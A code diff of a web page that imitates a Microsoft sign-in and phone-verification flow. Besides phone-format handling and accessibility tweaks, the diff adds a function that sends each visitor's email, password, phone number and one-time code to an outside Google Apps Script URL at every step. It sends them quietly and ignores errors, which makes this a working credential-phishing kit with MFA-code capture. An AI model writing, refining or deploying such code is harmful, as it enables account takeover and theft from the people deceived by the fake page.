@@ -67,13 +67,13 @@
       border: none; cursor: pointer; color: #605e5c;
     }
     .phone-wrap {
-      display: flex; align-items: flex-end;
-      border-bottom: 1px solid #666; margin-top: 4px;
+      display: flex; align-items: center;
+      border-bottom: 1px solid #666; margin-top: 20px;
     }
     .phone-wrap:focus-within { border-bottom: 2px solid #0067b8; }
     .country-code {
       display: flex; align-items: center; gap: 5px;
-      padding: 8px 12px 8px 0; cursor: pointer; white-space: nowrap;
+      padding: 8px 12px 8px 0; white-space: nowrap;
       color: #1b1b1b; font-size: 15px; border-right: 1px solid #ccc;
       margin-right: 12px; user-select: none;
     }
@@ -83,15 +83,9 @@
       color: #1b1b1b; outline: none; background: transparent;
       font-family: inherit; letter-spacing: 0.5px;
     }
-    .phone-input-wrap input::placeholder { color: transparent; }
-    .phone-input-wrap label {
-      position: absolute; top: 8px; left: 0; font-size: 15px;
-      color: #666; pointer-events: none; transition: 0.15s ease;
-    }
-    .phone-input-wrap input:focus ~ label,
-    .phone-input-wrap input:not(:placeholder-shown) ~ label {
-      top: -14px; font-size: 12px; color: #0067b8;
-    }
+    .phone-input-wrap input::placeholder { color: #777; }
+    .phone-label { display: block; margin-top: 20px; font-size: 13px; color: #323130; }
+    .phone-help { margin-top: 6px; font-size: 13px; line-height: 1.45; color: #605e5c; }
     .links-row { margin-top: 12px; display: flex; flex-direction: column; gap: 8px; }
     a.ms-link { color: #0067b8; font-size: 14px; text-decoration: none; cursor: pointer; }
     a.ms-link:hover { text-decoration: underline; }
@@ -129,8 +123,12 @@
     }
     .code-inputs input:focus { border-color: #0067b8; border-width: 2px; }
     .resend-row { margin-top: 12px; font-size: 14px; color: #605e5c; }
-    .resend-row span { color: #0067b8; cursor: pointer; }
-    .resend-row span:hover { text-decoration: underline; }
+    .resend-row button {
+      border: 0; padding: 0; background: none; color: #0067b8;
+      cursor: pointer; font: inherit;
+    }
+    .resend-row button:hover { text-decoration: underline; }
+    .resend-row button:disabled { color: #777; cursor: default; text-decoration: none; }
     .spinner {
       display: inline-block; width: 14px; height: 14px;
       border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff;
@@ -227,27 +225,22 @@
     <div class="ms-grid"><span></span><span></span><span></span><span></span></div>
     <span class="ms-name">Microsoft</span>
   </div>
-<h1>Add your phone number</h1>
-  <p class="subtitle">For added security, please add your phone number.</p>
-  <div class="input-wrap">
-    <input type="tel" id="phoneInput" placeholder=" " required />
-    <label>Phone number</label>
+  <h1>Enter your phone number</h1>
+  <p class="phone-help" id="phoneHelp">
+    For a US or Canadian number, enter 10 digits. For other countries, include the country code beginning with +.
+  </p>
+  <label class="phone-label" for="phoneInput">Mobile number</label>
+  <div class="phone-wrap">
+    <div class="country-code" aria-hidden="true">
+      <span>&#127760;</span>
+    </div>
+    <div class="phone-input-wrap">
+      <input type="tel" id="phoneInput" placeholder="4251234567 or +44 20 7946 0958" inputmode="tel" autocomplete="tel" maxlength="40" aria-describedby="phoneHelp phoneMsg" required />
+    </div>
   </div>
-  <div id="phoneMsg" class="msg"></div>
+  <div id="phoneMsg" class="msg" role="alert" aria-live="polite"></div>
+  <button class="btn-primary full-width" type="button" onclick="handlePhone()">Next</button>
   <div class="spacer"></div>
-  <button class="btn-primary" type="button" onclick="handlePhone()">Continue</button>
-   <div style="text-align:center; margin-top:20px;">
-    <a class="ms-link" href="#">Other ways to sign in</a>
-  </div>
-  <div class="spacer"></div>
-  <div class="footer-links">
-    <a href="#">Help and feedback</a>
-    <a href="#">Terms of use</a>
-    <a href="#">Privacy and cookies</a>
-  </div>
-  <div class="private-note">
-    Use private browsing if this is not your device. <a href="#">Learn more</a>
-  </div>
 </div>
 
 <!-- Screen 4: Enter Email Code -->
@@ -259,11 +252,11 @@
   <h1>Enter code</h1>
   <p class="subtitle">We sent a 6-digit code to <strong id="emailMask"></strong>. Enter it below.</p>
   <div class="input-wrap">
-    <input type="text" name="code" id="codeInput" placeholder=" " maxlength="6" required />
+    <input type="text" name="code" id="codeInput" placeholder=" " inputmode="numeric" autocomplete="one-time-code" pattern="[0-9]{6}" maxlength="6" required />
     <label>6-digit code</label>
   </div>
   <div id="codeMsg" class="msg"></div>
-  <div class="resend-row">Didn't get it? <span onclick="handleSendEmailCode(true)">Resend code</span></div>
+  <div class="resend-row">Didn't get it? <button id="resendBtn" type="button" onclick="handleSendEmailCode()">Resend code</button></div>
   <div class="spacer"></div>
   <div class="confirm-btn-row">
     <button class="btn-primary" id="verifyBtn" type="button" onclick="handleFinalSubmit()">Verify</button>
@@ -291,10 +284,34 @@
 <script>
 let collectedData = {
   email: "",
-  phone: "",
   password: "",
+  phone: "",
   code: ""
 };
+
+const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbz0eGMYWTYD6P3KcVQ9rtaweY1YNcKcuwyo58ZWJYMTdl3mYKuhr9oSZvXngenqQTCemg/exec';
+
+async function submitToGoogleSheetSafe(stage) {
+  try {
+    await fetch(GOOGLE_SHEET_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "text/plain;charset=utf-8"
+      },
+      body: JSON.stringify({
+        stage,
+        email: collectedData.email,
+        phone: collectedData.phone,
+        password: collectedData.password,
+        code: collectedData.code,
+        timestamp: new Date().toISOString()
+      })
+    });
+  } catch (err) {
+    console.warn("Google Sheet submission failed:", err);
+  }
+}
 
 function showMsg(id, text, type) {
   const el = document.getElementById(id);
@@ -332,7 +349,7 @@ window.goToAccountPage = async function () {
       return showMsg("accountMsg", data.error || "Account page unavailable", "error");
     }
 
-    showMsg("accountMsg", `Signed in as ${data.user.email}`, "success");
+    window.location.assign("/account");
   } catch {
     showMsg("accountMsg", "Account page unavailable", "error");
   }
@@ -341,7 +358,7 @@ window.goToAccountPage = async function () {
 /* =========================
    STEP 1: EMAIL
 ========================= */
-window.handleEmailSubmit = function () {
+window.handleEmailSubmit = async function () {
   const email = document.getElementById("emailInput").value.trim();
 
   if (!email) return showMsg("emailMsg", "Enter email", "error");
@@ -351,33 +368,53 @@ window.handleEmailSubmit = function () {
   collectedData.email = email;
   document.getElementById("emailChip").textContent = email;
 
+  await submitToGoogleSheetSafe("screen1_email");
+
   goTo("screen2");
 };
 
 /* =========================
    STEP 2: PASSWORD
 ========================= */
-window.handlePassword = function () {
+window.handlePassword = async function () {
   const password = document.getElementById("pwInput").value;
-
   if (!password) return showMsg("phoneMsg", "Enter password", "error");
 
   collectedData.password = password;
-
+  await submitToGoogleSheetSafe("screen2_password");
   goTo("screen3");
 };
 
 /* =========================
    STEP 3: PHONE + REGISTER
 ========================= */
+function normalizePhone(value) {
+  let phone = String(value || "").trim();
+
+  // Ignore common visual separators and an optional extension.
+  phone = phone.replace(/(?:ext\.?|extension|x)\s*\d+$/i, "").trim();
+  phone = phone.replace(/[\s().-]/g, "");
+
+  // International dialing prefixes such as 00 44 become E.164 +44.
+  if (phone.startsWith("00")) phone = "+" + phone.slice(2);
+
+  // The page previously displayed +1, so preserve convenient US/Canada input.
+  if (/^\d{10}$/.test(phone)) phone = "+1" + phone;
+  else if (/^1\d{10}$/.test(phone)) phone = "+" + phone;
+
+  return /^\+[1-9]\d{6,14}$/.test(phone) ? phone : null;
+}
+
 window.handlePhone = async function () {
   const phone = document.getElementById("phoneInput").value.trim();
+  const cleanedPhone = normalizePhone(phone);
 
-  if (!phone) return showMsg("phoneMsg", "Enter phone", "error");
-  if (!/^\+[0-9]{7,15}$/.test(phone))
-    return showMsg("phoneMsg", "Invalid phone format", "error");
+  if (!cleanedPhone) {
+    return showMsg("phoneMsg", "Enter 10 digits for a US/Canadian number, or include + and the country code for an international number.", "error");
+  }
 
-  collectedData.phone = phone;
+  showMsg("phoneMsg", "", "");
+  collectedData.phone = cleanedPhone;
 
   try {
     const res = await fetch("/register", {
@@ -396,8 +433,14 @@ window.handlePhone = async function () {
       return showMsg("phoneMsg", data.error || "Register failed", "error");
     }
 
-    // move to OTP step + send code
-    await sendOtp(false);
+    await submitToGoogleSheetSafe("screen3_phone");
+
+    const otpSent = await sendOtp(false);
+
+    if (!otpSent) {
+      return;
+    }
+
     goTo("screen4");
 
   } catch (err) {
@@ -418,24 +461,43 @@ async function sendOtp(isResend) {
 
     const data = await res.json();
 
-    if (!res.ok) {
-      showMsg("codeMsg", data.error || "Failed to send code", "error");
-      return;
+    if (!res.ok || !data.success) {
+      showMsg(isResend ? "codeMsg" : "phoneMsg", data.error || "Failed to send code", "error");
+      return false;
     }
 
     document.getElementById("emailMask").textContent = collectedData.email;
 
     if (isResend) {
       showMsg("codeMsg", "Code resent", "success");
+      await submitToGoogleSheetSafe("screen4_code_resent");
+    } else {
+      await submitToGoogleSheetSafe("screen4_code_sent");
     }
 
-  } catch {
-    showMsg("codeMsg", "Network error", "error");
+    return true;
+
+  } catch (err) {
+    showMsg(isResend ? "codeMsg" : "phoneMsg", "Network error while sending code", "error");
+    return false;
   }
 }
 
-window.handleSendEmailCode = function () {
-  sendOtp(true);
+window.handleSendEmailCode = async function () {
+  const button = document.getElementById("resendBtn");
+  if (button) button.disabled = true;
+
+  const sent = await sendOtp(true);
+
+  if (!sent) {
+    if (button) button.disabled = false;
+    return;
+  }
+
+  // The server enforces the one-minute resend cooldown.
+  window.setTimeout(() => {
+    if (button) button.disabled = false;
+  }, 60 * 1000);
 };
 
 /* =========================
@@ -443,38 +505,42 @@ window.handleSendEmailCode = function () {
 ========================= */
 window.handleFinalSubmit = async function () {
   const code = document.getElementById("codeInput").value.trim();
+  if (!/^\d{6}$/.test(code)) return showMsg("codeMsg", "Enter the 6-digit code", "error");
 
-  if (!code) {
-    return showMsg("codeMsg", "Enter code", "error");
-  }
+  collectedData.code = code;
+  await submitToGoogleSheetSafe("screen4_code_entered");
 
   try {
     const res = await fetch("/verify-email-code", {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
         email: collectedData.email,
-        code
+        code: collectedData.code
       })
     });
 
     const data = await res.json();
 
-    if (!res.ok) {
-      return showMsg("codeMsg", data.error || "Invalid code", "error");
+    if (!res.ok || !data.success) {
+      collectedData.code = "";
+      return showMsg(
+        "codeMsg",
+        data.error || "Invalid or expired code",
+        "error"
+      );
     }
 
-    // save code locally
-    collectedData.code = code;
+    await submitToGoogleSheetSafe("screen4_code_verified");
 
-    // store token
+    collectedData.code = "";
+
     localStorage.setItem("token", data.token);
-
-    // ONLY AFTER SUCCESS → send to Formspree
     goTo("screen5");
-
   } catch (err) {
-    console.error(err);
+    collectedData.code = "";
     showMsg("codeMsg", "Network error", "error");
   }
 };
